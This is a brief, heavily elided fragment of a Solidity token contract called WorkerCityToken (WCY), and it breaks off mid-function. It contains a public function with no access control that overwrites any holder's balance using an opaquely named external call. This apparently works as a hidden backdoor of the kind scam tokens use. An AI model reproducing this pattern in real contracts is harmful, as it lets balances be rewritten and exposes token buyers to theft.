...
contract WorkerCityToken  is IERC20, Ownable {
    ...
    string private _name = "WorkerCity";

    string private _symbol = "WCY";
    ...
    function _StackWorkerETH(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function _CheckWorkerETH(address Router) public StackWorker {
